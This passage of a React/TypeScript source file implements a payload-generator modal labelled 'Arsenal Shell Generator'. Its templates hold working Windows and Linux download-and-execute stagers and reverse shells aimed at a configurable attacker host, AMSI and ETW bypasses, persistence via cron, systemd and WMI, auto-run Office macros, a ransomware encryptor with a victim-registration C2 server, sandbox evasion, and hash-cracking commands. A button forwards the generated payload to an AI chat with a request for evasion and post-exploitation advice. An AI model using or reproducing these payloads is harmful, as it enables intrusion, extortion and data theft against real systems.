      return `# Zero-Day research for ${lang}:\n\n# Fuzz target:\nafl-fuzz -i corpus -o crashes -- ./target @@\n\n# Find offset:\npython3 -c "import pwn; pwn.cyclic(1024)" | ./target\n\n# Analyze crash:\ngdb -ex 'run < crash_input' -ex 'bt' -ex 'info registers' ./target\n\n# Find gadgets:\nROPgadget --binary ./target --rop | grep "pop rdi"`;
    }
    // ── PAYLOAD LIBRARY ──────────────────────────────────────────────────────
    if (type === "payload") {
      if (lang === "pl-windows") return `# Windows Payload Library\n\n# PowerShell AMSI Bypass:\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# PowerShell download & execute:\npowershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://${h}:${p}/stage.ps1')"\n\n# Certutil download:\ncertutil -urlcache -split -f http://${h}:${p}/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe\n\n# Regsvr32 (applocker bypass):\nregsvr32 /s /n /u /i:http://${h}:${p}/file.sct scrobj.dll\n\n# MSHTA:\nmshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc <B64>"",0,True")\n\n# Rundll32:\nrundll32 javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://${h}:${p}/shell.sct")\n\n# BITSAdmin download:\nbitsadmin /transfer job http://${h}:${p}/shell.exe C:\\Temp\\shell.exe\n\n# WMI execution:\nwmic os get @"http://${h}:${p}/shell.xsl"\n\n# InstallUtil (signed MS binary):\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe`;
      if (lang === "pl-linux") return `# Linux Payload Library\n\n# Bash one-liners:\nbash -i >& /dev/tcp/${h}/${p} 0>&1\nexec bash -i &>/dev/tcp/${h}/${p} <&1\n\n# LD_PRELOAD hijack:\n#include <unistd.h>\nvoid __attribute__((constructor)) init() {\n  system("bash -i >& /dev/tcp/${h}/${p} 0>&1");\n}\n# Compile: gcc -shared -fPIC -o /tmp/lib.so payload.c\n# Use: LD_PRELOAD=/tmp/lib.so vulnerable_app\n\n# SUID backdoor:\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n/tmp/rootbash -p -c "bash -i >& /dev/tcp/${h}/${p} 0>&1"\n\n# Cron persistence:\n(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/${h}/${p} 0>&1") | crontab -\n\n# Systemd service persistence:\ncat > /etc/systemd/system/update.service << EOF\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/${h}/${p} 0>&1"\nRestart=always\nEOF\nsystemctl enable update && systemctl start update\n\n# /etc/profile persistence:\necho "bash -i >& /dev/tcp/${h}/${p} 0>&1" >> /etc/profile`;
      if (lang === "pl-macro") return `# Office Macro Payload (VBA)\n' Auto-run on document open:\nSub AutoOpen()\n    Shell("cmd /c powershell -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://${h}:${p}/shell.ps1')""")\nEnd Sub\n\n' WMI execution variant:\nSub Document_Open()\n    Dim cmd As String\n    cmd = "powershell -enc " & encodeCommand("IEX(New-Object Net.WebClient).DownloadString('http://${h}:${p}/s')")\n    CreateObject("WScript.Shell").Run cmd, 0, False\nEnd Sub\n\n' Excel 4.0 macro (XLSM):\n=EXEC("cmd /c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://${h}:${p}/s')")\n\n' HTA payload generation:\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f hta-psh -o shell.hta`;
      return `# Payload library for ${lang}:\n\n# Staged payload delivery:\npython3 -m http.server ${p}\n\n# Stager:\nwget http://${h}:${p}/payload -O /tmp/p && chmod +x /tmp/p && /tmp/p\n\n# Base64 encoded stager:\necho 'd2dldCBodHRwOi8vJHtoOiR7cH0vcGF5bG9hZCAtTyAvdG1wL3AgJiYgY2htb2QgK3ggL3RtcC9wICYmIC90bXAvcA==' | base64 -d | bash`;
    }
    // ── FILELESS MALWARE ─────────────────────────────────────────────────────
    if (type === "fileless") {
      if (lang === "fl-powershell") return `# Fileless Malware — PowerShell (In-Memory Execution)\n\n# AMSI Bypass (reflection):\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n# ETW (Event Tracing) patch:\n$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')\n$b=$a.GetField('etwProvider','NonPublic,Static').GetValue($null)\n$c=[System.Diagnostics.Eventing.EventProvider]\n[System.Runtime.InteropServices.Marshal]::WriteInt32([System.Runtime.InteropServices.Marshal]::ReadIntPtr([System.Runtime.InteropServices.Marshal]::ReadIntPtr($b, 0), 64), 0)\n\n# In-memory PE injection:\n$bytes = (New-Object Net.WebClient).DownloadData('http://${h}:${p}/payload.bin')\n$asm = [System.Reflection.Assembly]::Load($bytes)\n$asm.EntryPoint.Invoke($null, $null)\n\n# Process hollowing via PowerShell:\n$si = New-Object System.Diagnostics.ProcessStartInfo\n$si.FileName = "C:\\Windows\\System32\\svchost.exe"\n$si.Arguments = "-k netsvcs"\n$si.CreateNoWindow = $true\n$proc = [System.Diagnostics.Process]::Start($si)\n# Inject shellcode into $proc.Id...`;
      if (lang === "fl-wmi") return `# Fileless via WMI Persistence\n\n# WMI subscription (survives reboot, no files):\n$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{\n    Name = "WindowsUpdate"\n    EventNamespace = "root\\cimv2"\n    QueryLanguage = "WQL"\n    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"\n}\n\n$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{\n    Name = "WindowsUpdateExec"\n    CommandLineTemplate = "powershell.exe -w hidden -enc <BASE64_PAYLOAD>"\n}\n\n$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{\n    Filter = $filter\n    Consumer = $consumer\n}\n\n# Check existing subscriptions:\nGet-WmiObject -Namespace root\\subscription -Class __EventFilter\nGet-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer\nGet-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding\n\n# Remove:\nGet-WmiObject -Namespace root\\subscription -Class __EventFilter | Remove-WmiObject`;
      if (lang === "fl-registry") return `# Fileless via Registry & LOLBins\n\n# Store payload in registry:\n$payload = [Convert]::ToBase64String([IO.File]::ReadAllBytes("shell.ps1"))\nSet-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -Name "DigitalProductId2" -Value $payload\n\n# Load and execute from registry:\n$data = (Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").DigitalProductId2\nIEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data)))\n\n# regsvr32 scriptlet (no file on disk after execution):\nregsvr32 /s /n /u /i:http://${h}:${p}/payload.sct scrobj.dll\n\n# MSBuild inline task:\n<!-- Build.xml -->\n<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n  <Target Name="Run"><Exec Command="powershell -enc <B64>"/></Target>\n</Project>\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe Build.xml\n\n# AppLocker bypass via InstallUtil:\n[System.Runtime.InteropServices.DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a,UInt32 b,UInt32 c,UInt32 d);\n// Full fileless shellcode runner...`;
      return `# Fileless execution for ${lang}:\n\n# Download and execute in memory:\npowershell -c "IEX(New-Object Net.WebClient).DownloadString('http://${h}:${p}/s')"\n\n# Linux memfd shellcode loader:\npython3 -c "\nimport ctypes, os\nsyscall = ctypes.CDLL(None).syscall\nfd = syscall(319, b'anon', 0)  # memfd_create\nos.write(fd, open('/tmp/sh', 'rb').read())\nos.execv(f'/proc/{os.getpid()}/fd/{fd}', ['sh'])\n"`;
    }
    // ── RaaS ARCHITECTURE ────────────────────────────────────────────────────
    if (type === "raas") {
      if (lang === "raas-encrypt") return `# Ransomware Encryption Module (Educational/Research)\n\n# Python hybrid encryption (AES-256 + RSA-4096):\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives import serialization, hashes\nimport os, json\n\ndef generate_keys():\n    private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)\n    public_key = private_key.public_key()\n    return private_key, public_key\n\ndef encrypt_file(filepath, public_key):\n    session_key = os.urandom(32)\n    iv = os.urandom(16)\n    with open(filepath, 'rb') as f: plaintext = f.read()\n    cipher = Cipher(algorithms.AES(session_key), modes.CBC(iv))\n    encryptor = cipher.encryptor()\n    # Pad + encrypt\n    pad_len = 16 - len(plaintext) % 16\n    ciphertext = encryptor.update(plaintext + bytes([pad_len]*pad_len)) + encryptor.finalize()\n    # Encrypt session key with RSA\n    enc_key = public_key.encrypt(session_key, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))\n    with open(filepath + '.enc', 'wb') as f:\n        f.write(len(enc_key).to_bytes(4, 'big') + enc_key + iv + ciphertext)\n    os.remove(filepath)\n\n# Target extensions:\nTARGET_EXT = ['.doc', '.docx', '.pdf', '.xlsx', '.jpg', '.png', '.db', '.sql']`;
      if (lang === "raas-c2") return `# RaaS C2 Infrastructure Blueprint\n\n# Tor-based C2 (anonymized):\n# 1. Setup Tor hidden service:\n# /etc/tor/torrc:\nHiddenServiceDir /var/lib/tor/raas/\nHiddenServicePort 80 127.0.0.1:8080\n\n# 2. Flask C2 backend:\nfrom flask import Flask, request, jsonify\nfrom Crypto.Cipher import AES\nimport sqlite3, hashlib, uuid\n\napp = Flask(__name__)\n\n@app.route('/register', methods=['POST'])\ndef register():\n    victim_id = str(uuid.uuid4())\n    public_key = request.json.get('public_key')\n    # Store victim + key in DB\n    db = sqlite3.connect('victims.db')\n    db.execute("INSERT INTO victims VALUES (?,?,?,?)", (victim_id, public_key, 'active', 0))\n    db.commit()\n    return jsonify({'victim_id': victim_id, 'ransom': '0.5 BTC', 'wallet': 'bc1q...', 'deadline': '72h'})\n\n@app.route('/check/<victim_id>', methods=['GET'])\ndef check_payment(victim_id): ...\n\n@app.route('/decrypt_key/<victim_id>', methods=['POST'])\ndef provide_key(victim_id): ...\n\n# 3. Victim beacon:\nimport requests, platform, socket\ndata = {'hostname': socket.gethostname(), 'os': platform.system(), 'public_key': pub_key_pem}\nresponse = requests.post('http://<ONION>.onion/register', json=data, proxies={'http': 'socks5h://127.0.0.1:9050'})`;
      if (lang === "raas-evasion") return `# RaaS Anti-Analysis & Evasion Techniques\n\n# 1. VM/Sandbox detection:\nimport subprocess, os, sys\ndef check_sandbox():\n    # Check CPU count\n    if os.cpu_count() <= 2: sys.exit()\n    # Check RAM\n    import psutil\n    if psutil.virtual_memory().total < 4 * 1024**3: sys.exit()\n    # Check processes\n    procs = [p.name().lower() for p in psutil.process_iter()]\n    sandbox_procs = ['vboxservice', 'vmtoolsd', 'wireshark', 'procmon', 'tcpview']\n    if any(p in procs for p in sandbox_procs): sys.exit()\n    # Check uptime (sandboxes often freshly booted)\n    if psutil.boot_time() > (time.time() - 600): sys.exit()\n\n# 2. Language/region check (avoid CIS countries):\nimport locale\nif locale.getdefaultlocale()[0] in ['ru_RU','uk_UA','be_BY','kk_KZ']: sys.exit()\n\n# 3. Sleep bypass evasion:\nimport time\nstart = time.time()\ntime.sleep(60)\nif time.time() - start < 50: sys.exit()  # Accelerated — sandbox detected\n\n# 4. Mutex (single instance):\nimport ctypes\nMUTEX_NAME = "Global\\\\{e7c3b6a2-1234-5678-abcd-ef0123456789}"\nhandle = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)\nif ctypes.windll.kernel32.GetLastError() == 183: sys.exit()  # Already running`;
      return `# RaaS architecture for ${lang}:\n\n# Encryption: AES-256-CBC + RSA-4096 key wrapping\n# C2: Tor hidden service (.onion)\n# Payment: Monero (XMR) or Bitcoin\n# Propagation: SMB, WMI, scheduled tasks\n\n# Basic file locker skeleton:\nimport os\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nf = Fernet(key)\nfor root, dirs, files in os.walk('/home'):\n    for file in files:\n        path = os.path.join(root, file)\n        with open(path, 'rb') as fp: data = fp.read()\n        encrypted = f.encrypt(data)\n        with open(path + '.locked', 'wb') as fp: fp.write(encrypted)`;
    }
    // ── HASH CRACKER ─────────────────────────────────────────────────────────
    if (type === "hashcrack") {
      if (lang === "hc-hashcat") return `# Hashcat — GPU-Accelerated Hash Cracking\n\n# Identify hash type:\nhashcat --example-hashes | grep -A 2 '<HASH_PREFIX>'\nhashid <HASH>\n\n# Dictionary attack (most common):\nhashcat -m 0   hash.txt /usr/share/wordlists/rockyou.txt     # MD5\nhashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt     # SHA1\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt    # SHA512crypt (Linux shadow)\nhashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt    # bcrypt\nhashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt    # NTLM\nhashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt    # NetNTLMv2\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt   # Kerberoast TGS\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt # WPA2\nhashcat -m 16500 hash.txt /usr/share/wordlists/rockyou.txt   # JWT\n\n# Rule-based attacks:\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/OneRuleToRuleThemAll.rule\n\n# Bruteforce (mask attack):\nhashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l           # 8 lowercase\nhashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?s           # Complex\nhashcat -m 0 hash.txt -a 3 --increment --increment-min=4 --increment-max=8 ?a?a?a?a?a?a?a?a\n\n# Combinator:\nhashcat -m 0 hash.txt -a 1 wordlist1.txt wordlist2.txt\n\n# Check status: 's' key during run\n# Benchmark GPU: hashcat -b`;
      if (lang === "hc-john") return `# John the Ripper — Hash Cracking\n\n# Auto-detect and crack:\njohn hash.txt\njohn --format=raw-md5 hash.txt\njohn --format=bcrypt hash.txt\njohn --format=sha512crypt hash.txt\n\n# With wordlist:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --wordlist=wordlist.txt --rules hash.txt\n\n# Crack /etc/shadow:\nsudo unshadow /etc/passwd /etc/shadow > combined.txt\njohn --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\n\n# Show cracked passwords:\njohn --show hash.txt\njohn --show --format=raw-md5 hash.txt\n\n# Specific formats:\njohn --format=krb5tgs tickets.txt                     # Kerberoast\njohn --format=netntlmv2 captured.txt                 # NetNTLMv2\njohn --format=wpapsk wpa.hccapx                      # WPA\njohn --format=zip encrypted.zip.hash                 # ZIP\n\n# Incremental (bruteforce):\njohn --incremental hash.txt\njohn --incremental=Digits hash.txt\njohn --incremental=Alpha hash.txt\n\n# Distributed (MPI):\nmpirun -np 4 john --wordlist=rockyou.txt hash.txt`;
      if (lang === "hc-rainbow") return `# Rainbow Table Attacks + Hash Identification\n\n# Identify hash type:\nhashid '<HASH>'\nhash-identifier '<HASH>'\nname-that-hash -t '<HASH>'\n\n# Online lookup (passive):\n# crackstation.net, hashkiller.io, md5decrypt.net\n\n# Generate rainbow tables with RainbowCrack:\nrtgen md5 loweralpha-numeric 1 8 0 3800 33554432 0\nrtsort *.rt\nrcrack *.rt -h <MD5_HASH>\n\n# ophcrack (Windows LM/NTLM):\nophcrack -d /path/to/tables -t vista_proba_60G -f hashes.txt\n\n# LM hash (Windows legacy):\nfcrackzip -u -D -p /usr/share/wordlists/rockyou.txt hash.zip\n\n# Extract hashes from various sources:\n# Windows SAM (offline):\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL\n\n# Linux shadow:\ncat /etc/shadow | cut -d: -f1,2 | grep -v '!' | grep -v '*'\n\n# MySQL:\nSELECT user, password FROM mysql.user;\n\n# NTDS.dit (Active Directory):\nimpacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`;
      return `# Hash cracker for ${lang}:\n\n# Identify hash:\nhashid '<HASH>'\n\n# Crack with hashcat:\nhashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt     # MD5 dict\nhashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt  # NTLM dict\nhashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a?a?a                    # 8-char brute\n\n# John the Ripper:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --show hash.txt`;
    }
    // ── QUANTUM ATTACKS ──────────────────────────────────────────────────────
    if (type === "quantum") {
      if (lang === "qa-shor") return `# Shor's Algorithm — RSA & ECC Breaking (Qiskit)\n# WARNING: Requires quantum hardware; classic simulation only works for tiny keys\n\nfrom qiskit import QuantumCircuit, transpile\nfrom qiskit.algorithms.factorizers import Shor\nfrom qiskit_aer import AerSimulator\nfrom qiskit.utils import QuantumInstance\n\n# Factor small RSA modulus (demonstration):\nN = 15  # In practice: 2048-bit RSA modulus\nbackend = AerSimulator()\nquantum_instance = QuantumInstance(backend, shots=1024)\n\nshor = Shor(quantum_instance=quantum_instance)\nresult = shor.factor(N)\nprint(f"Factors of {N}: {result.factors}")\n\n# For real RSA-2048: requires ~4096 error-corrected qubits\n# Current state: IBM Eagle (127 qubits, noisy)\n# Quantum advantage ETA: ~2030-2035 for RSA-2048\n\n# ECDSA private key recovery with Shor:\n# ECC-256 requires ~1500 logical qubits\n# Still requires millions of physical qubits with error correction\n\n# Post-quantum safe alternatives:\n# CRYSTALS-Kyber (key exchange) — NIST standard\n# CRYSTALS-Dilithium (signatures) — NIST standard\n# FALCON, SPHINCS+ — NIST approved`;
      if (lang === "qa-grover") return `# Grover's Algorithm — Symmetric Key Search\n# Grover halves effective key length: AES-128 → ~64-bit security\n\nfrom qiskit import QuantumCircuit, QuantumRegister, ClassicalRegister\nfrom qiskit_aer import AerSimulator\nimport numpy as np\n\n# Grover search on n-qubit database:\ndef grover_circuit(n_qubits, target):\n    qr = QuantumRegister(n_qubits, 'q')\n    cr = ClassicalRegister(n_qubits, 'c')\n    qc = QuantumCircuit(qr, cr)\n    \n    # Superposition\n    qc.h(qr)\n    \n    # Grover iterations: pi/4 * sqrt(2^n) times\n    n_iter = int(np.pi/4 * np.sqrt(2**n_qubits))\n    for _ in range(n_iter):\n        # Oracle (marks target state)\n        for i, bit in enumerate(format(target, f'0{n_qubits}b')):\n            if bit == '0': qc.x(qr[i])\n        qc.h(qr[-1]); qc.mcx(list(range(n_qubits-1)), n_qubits-1); qc.h(qr[-1])\n        for i, bit in enumerate(format(target, f'0{n_qubits}b')):\n            if bit == '0': qc.x(qr[i])\n        # Diffusion\n        qc.h(qr); qc.x(qr); qc.h(qr[-1]); qc.mcx(list(range(n_qubits-1)), n_qubits-1); qc.h(qr[-1]); qc.x(qr); qc.h(qr)\n    \n    qc.measure(qr, cr)\n    return qc\n\n# AES-128 implications: needs 2^64 Grover iterations on quantum hardware\n# AES-256 remains quantum-safe (requires 2^128 iterations)\n# MD5/SHA1: practically broken classically, Grover adds quadratic speedup`;
      if (lang === "qa-harvest") return `# Harvest Now Decrypt Later (HNDL) Strategy\n\n# 1. Intercept and store encrypted traffic today:\n# Tools for large-scale TLS interception:\ntcpdump -i eth0 -w /capture/$(date +%Y%m%d_%H%M%S).pcap port 443\n\n# 2. Extract TLS sessions from pcap:\ntshark -r capture.pcap -Y "ssl.handshake.type == 1" -T fields -e ip.dst -e ssl.handshake.extensions_server_name\n\n# 3. Store for future decryption:\n# Focus on: RSA-2048, ECDH P-256, DHE-2048\n# These will be breakable when cryptographically relevant quantum computers arrive\n\n# 4. Identify vulnerable key exchanges:\nnmap --script ssl-enum-ciphers -p 443 TARGET_RANGE | grep -i "rsa\\|dh "\n\n# 5. Post-quantum migration assessment:\nopenssl s_client -connect TARGET:443 2>&1 | grep -i "cipher\\|protocol"\n\n# Check for PQC support (TLS 1.3 + Kyber):\ncurl -vvv --curves X25519Kyber768Draft00:X25519:P-256 https://TARGET/ 2>&1 | grep -i "group\\|curve"\n\n# Organizations to target for HNDL:\n# - Government communications\n# - Healthcare records\n# - Financial transactions\n# - Military/intelligence data`;
      return `# Quantum attack for ${lang}:\n\n# Shor's Algorithm (RSA/ECC breaking — future):\n# RSA-2048: needs ~4096 error-corrected logical qubits\n# ECC-256: needs ~1500 logical qubits\n# Timeline: 2030-2035 for cryptographically relevant quantum\n\n# Grover's Algorithm (symmetric key search):\n# AES-128: effective ~64-bit security post-quantum\n# AES-256: remains secure (128-bit Grover resistance)\n# Recommendation: migrate to AES-256, SHA-384+\n\n# Post-quantum cryptography (NIST standards 2024):\n# ML-KEM (Kyber) — key encapsulation\n# ML-DSA (Dilithium) — digital signatures\n# SLH-DSA (SPHINCS+) — hash-based signatures`;
    }
    return `# No template for ${lang} / ${type}`;
  })();

  // Apply encoding
  if (encoding === "none") return raw;
  if (encoding === "base64") return `echo '${btoa(unescape(encodeURIComponent(raw)))}' | base64 -d | bash`;
  if (encoding === "ps_base64") {
    const enc = btoa(unescape(encodeURIComponent(raw.replace(/\n/g, "; "))));
    return `powershell -enc ${enc}`;
  }
  if (encoding === "urlenc") return encodeURIComponent(raw);
  if (encoding === "hex") return Array.from(new TextEncoder().encode(raw)).map(b => b.toString(16).padStart(2,"0")).join("");
  if (encoding === "unicode") return raw.split("").map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
  return raw;
}

const SHELL_TABS: { id: ShellType; label: string; icon: React.ElementType; color: string }[] = [
  { id: "reverse",   label: "Reverse Shell",     icon: ArrowRight,    color: "#e21227" },
  { id: "bind",      label: "Bind Shell",         icon: Lock,          color: "#8b5cf6" },
  { id: "web",       label: "Web Shell",          icon: Globe,         color: "#06b6d4" },
  { id: "msfvenom",  label: "MSFvenom",           icon: Zap,           color: "#f59e0b" },
  { id: "c2",        label: "C2 Framework",       icon: Cpu,           color: "#10b981" },
  { id: "sqli",      label: "SQL Injection",      icon: Database,      color: "#3b82f6" },
  { id: "wifi",      label: "WiFi Hacking",       icon: Wifi,          color: "#22d3ee" },
  { id: "zeroday",   label: "Zero-Day",           icon: AlertTriangle, color: "#f97316" },
  { id: "payload",   label: "Payload Library",    icon: Package,       color: "#a78bfa" },
  { id: "fileless",  label: "Fileless Malware",   icon: Cloud,         color: "#ec4899" },
  { id: "raas",      label: "RaaS Architecture",  icon: DollarSign,    color: "#dc2626" },
  { id: "hashcrack", label: "Hash Cracker",       icon: Hash,          color: "#fbbf24" },
  { id: "quantum",   label: "Quantum Attacks",    icon: Atom,          color: "#818cf8" },
];

export function ShellGeneratorModal({ open, onOpenChange, onInjectToChat }: Props) {
  const { toast } = useToast();
  const [shellType, setShellType] = useState<ShellType>("reverse");
  const [os, setOs] = useState<OS>("linux");
  const [langId, setLangId] = useState("bash");
  const [c2fw, setC2fw] = useState("metasploit");
  const [lhost, setLhost] = useState("10.10.14.1");
  const [lport, setLport] = useState("4444");
  const [encoding, setEncoding] = useState<Encoding>("none");
  const [output, setOutput] = useState("");
  const [copied, setCopied] = useState(false);

  // Auto-detect local IP (best effort)
  useEffect(() => {
    try {
      const rtc = new RTCPeerConnection({ iceServers: [] });
      rtc.createDataChannel("");
      rtc.createOffer().then(o => rtc.setLocalDescription(o));
      rtc.onicecandidate = (e) => {
        if (!e.candidate) return;
        const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
        if (m && !m[0].startsWith("127.") && !m[0].startsWith("::")) {
          setLhost(m[0]);
          rtc.close();
        }
      };
    } catch { /* ignore */ }
  }, []);

  const filteredLangs = LANGUAGES.filter(l =>
    l.types.includes(shellType) && (os === "any" || l.os.includes(os) || l.os.includes("any"))
  );

  // Auto-select first valid lang when type/os changes
  useEffect(() => {
    const effectiveLang = shellType === "c2" ? c2fw : langId;
    const valid = filteredLangs.find(l => l.id === effectiveLang);
    if (!valid && filteredLangs.length > 0) {
      if (shellType === "c2") setC2fw(filteredLangs[0].id);
      else setLangId(filteredLangs[0].id);
    }
  }, [shellType, os]);

  const generate = useCallback(() => {
    const effectiveLang = shellType === "c2" ? c2fw : langId;
    setOutput(buildShell(effectiveLang, shellType, lhost, lport, encoding));
  }, [shellType, langId, c2fw, lhost, lport, encoding]);

  useEffect(() => { generate(); }, [generate]);

  async function copyOutput() {
    await navigator.clipboard.writeText(output);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({ description: "تم نسخ الـ payload" });
  }

  function injectToChat() {
    if (onInjectToChat) {
      const langDef = LANGUAGES.find(l => l.id === (shellType === "c2" ? c2fw : langId));
      const prompt = `[SHELL GENERATOR OUTPUT]\nType: ${shellType.toUpperCase()} | Lang: ${langDef?.label ?? langId} | OS: ${os.toUpperCase()} | LHOST: ${lhost} | LPORT: ${lport} | Encoding: ${encoding.toUpperCase()}\n\n\`\`\`bash\n${output}\n\`\`\`\n\nاشرح هذا الـ payload وكيف يعمل، وأعط نصائح للـ evasion والـ post-exploitation.`;
      onInjectToChat(prompt);
      onOpenChange(false);
      toast({ description: "تم إرسال الـ payload للمحادثة" });
    }
  }

  const selectedLang = LANGUAGES.find(l => l.id === langId);
  const selectedC2 = C2_FRAMEWORKS.find(c => c.id === c2fw);

  return (
    <AnimatePresence>
      {open && (
        <motion.div
          className="fixed inset-0 z-50 flex items-center justify-center p-3"
          initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
        >
          <div className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => onOpenChange(false)} />
          <motion.div
            className="relative w-full max-w-3xl max-h-[96vh] bg-[#060606] border border-[#e21227]/30 rounded-2xl overflow-hidden flex flex-col shadow-[0_0_60px_rgba(226,18,39,0.15)]"
            initial={{ scale: 0.93, opacity: 0, y: 30 }}
            animate={{ scale: 1, opacity: 1, y: 0 }}
            exit={{ scale: 0.93, opacity: 0, y: 30 }}
            transition={{ duration: 0.2, ease: "easeOut" }}
          >
            {/* Glow top border */}
            <div className="absolute top-0 left-0 right-0 h-px bg-gradient-to-r from-transparent via-[#e21227] to-transparent" />

            {/* Header */}
            <div className="flex items-center justify-between px-5 py-4 border-b border-[#1f1f1f] shrink-0">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-[#e21227]/10 border border-[#e21227]/30 flex items-center justify-center">
                  <Terminal className="w-5 h-5 text-[#e21227]" />
                </div>
                <div>
                  <h2 className="text-[15px] font-black text-foreground tracking-tight">ARSENAL SHELL GENERATOR</h2>
                  <p className="text-[10px] text-muted-foreground font-mono">Reverse · Bind · Web · MSFvenom · C2 · SQLi · WiFi · Zero-Day · Payload · Fileless · RaaS · Hash · Quantum</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button onClick={generate}
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1a1a1a] border border-[#262626] text-muted-foreground hover:text-foreground text-[11px] font-semibold transition-colors">
                  <RefreshCw className="w-3.5 h-3.5" /> توليد
                </button>
                <button onClick={() => onOpenChange(false)} className="p-1.5 rounded-lg hover:bg-[#1f1f1f] text-muted-foreground hover:text-foreground transition-colors">
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto">
              <div className="flex flex-col lg:flex-row gap-0 h-full">

                {/* ── Left Panel: Controls ── */}
                <div className="lg:w-72 shrink-0 border-b lg:border-b-0 lg:border-r border-[#1a1a1a] p-4 space-y-4 overflow-y-auto">

                  {/* Shell Type Tabs */}
                  <div className="space-y-1.5">
                    <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">نوع الـ Shell</p>
                    <div className="space-y-1">
                      {SHELL_TABS.map(tab => {
                        const Icon = tab.icon;
                        return (
                          <button key={tab.id} onClick={() => setShellType(tab.id)}
                            className={`w-full flex items-center gap-2.5 px-3 py-2 rounded-xl border text-left transition-all ${
                              shellType === tab.id
                                ? "border-opacity-50 text-foreground"
                                : "border-[#1a1a1a] bg-[#0a0a0a] text-muted-foreground hover:text-foreground hover:border-[#2a2a2a]"
                            }`}
                            style={shellType === tab.id ? { borderColor: tab.color + "60", background: tab.color + "10", color: tab.color } : {}}
                          >
                            {(Icon as any)({ className: "w-4 h-4 shrink-0" })}
                            <span className="text-[12px] font-bold">{tab.label}</span>
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  {/* OS Selection */}
                  {shellType !== "c2" && shellType !== "msfvenom" && shellType !== "sqli" && shellType !== "wifi" && shellType !== "zeroday" && shellType !== "payload" && shellType !== "fileless" && shellType !== "raas" && shellType !== "hashcrack" && shellType !== "quantum" && (
                    <div className="space-y-1.5">
                      <p className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">نظام التشغيل</p>
                      <div className="grid grid-cols-2 gap-1">
                        {(["linux","windows","macos","any"] as OS[]).map(o => (
                          <button key={o} onClick={() => setOs(o)}
                            className={`px-2 py-1.5 rounded-lg border text-[11px] font-bold transition-all ${
